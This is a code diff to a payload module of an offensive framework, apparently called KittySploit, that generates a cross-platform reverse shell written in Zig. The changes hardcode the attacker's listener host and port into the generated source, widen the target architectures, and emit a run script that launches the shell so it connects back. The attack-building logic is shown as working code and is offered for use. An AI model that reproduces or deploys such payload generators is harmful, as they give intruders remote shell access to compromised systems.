@@ -12,8 +12,7 @@ class Module(Payload):
         'description': 'Simple reverse shell in Zig - cross-platform compilation (requires Zig compiler)',
         'author': 'KittySploit Team',
         'version': '1.0.0',
-        'category': 'singles',
-        'arch': Arch.X64,
+        'arch': [Arch.X64, Arch.X86, Arch.ARM, Arch.ARM64, Arch.MIPS, Arch.MIPS64, Arch.RISC_V, Arch.WASM32],
         'listener': 'listeners/multi/reverse_tcp',
         'handler': Handler.REVERSE,
         'session_type': SessionType.SHELL,
@@ -26,11 +25,11 @@ class Module(Payload):
     lhost = OptString('127.0.0.1', 'Connect to IP address', True)
     lport = OptPort(4444, 'Connect to port', True)
     target_os = OptChoice('linux', 'Target operating system', True, 
-                         ['linux', 'windows', 'macos', 'freebsd', 'netbsd', 'openbsd', 'dragonfly'])
+                         choices=['linux', 'windows', 'macos', 'freebsd', 'netbsd', 'openbsd', 'dragonfly'])
     target_arch = OptChoice('x86_64', 'Target architecture', True,
-                            ['x86_64', 'x86', 'aarch64', 'arm', 'mips', 'mips64', 'riscv64', 'wasm32'])
+                            choices=['x86_64', 'x86', 'aarch64', 'arm', 'mips', 'mips64', 'riscv64', 'wasm32'])
     optimization = OptChoice('ReleaseSmall', 'Optimization level', False,
-                           ['Debug', 'ReleaseFast', 'ReleaseSafe', 'ReleaseSmall'])
+                           choices=['Debug', 'ReleaseFast', 'ReleaseSafe', 'ReleaseSmall'])
     auto_compile = OptBool(False, 'Automatically compile after generation', False)
     output_dir = OptString('output', 'Output directory for compiled binaries', False)
     
@@ -321,10 +320,19 @@ pub fn main() !void {
         src_dir = output_path / "src"
         src_dir.mkdir(parents=True, exist_ok=True)
         
-        # Write Zig source code
+        # Write Zig source code with embedded listener details
+        zig_source = self.ZIG_SOURCE_CODE
+        zig_source = zig_source.replace(
+            'const host = if (args.len > 1) args[1] else "127.0.0.1";',
+            f'const host = "{lhost}";'
+        )
+        zig_source = zig_source.replace(
+            'const port = if (args.len > 2) try std.fmt.parseInt(u16, args[2], 10) else 4444;',
+            f'const port: u16 = {int(lport)};'
+        )
         zig_file = src_dir / "shell.zig"
         with open(zig_file, 'w', encoding='utf-8') as f:
-            f.write(self.ZIG_SOURCE_CODE)
+            f.write(zig_source)
         
         print_success(f"Source code saved to: {zig_file}")
         
@@ -434,12 +442,21 @@ pub fn main() !void {
         # Create payload execution script
         payload_script = output_path / "payload.sh"
         with open(payload_script, 'w', encoding='utf-8') as f:
-            f.write(f"./shell {lhost} {lport}\n")
+            f.write("./shell\n")
         
         if os.name != 'nt':
             os.chmod(payload_script, 0o755)
         
         print_success("Payload generation complete!")
         print_info(f"To compile manually: cd {output_dir} && bash compile.sh")
-        print_info(f"To run: cd {output_dir} && ./shell {lhost} {lport}")
+        print_info(f"To run: cd {output_dir} && ./shell")
+
+        return {
+            'source': str(zig_file),
+            'compile_script': str(compile_script),
+            'payload_script': str(payload_script),
+            'binary_path': str(binary_path),
+            'target': zig_target,
+            'connect_to': f"{lhost}:{lport}"
+        }
 
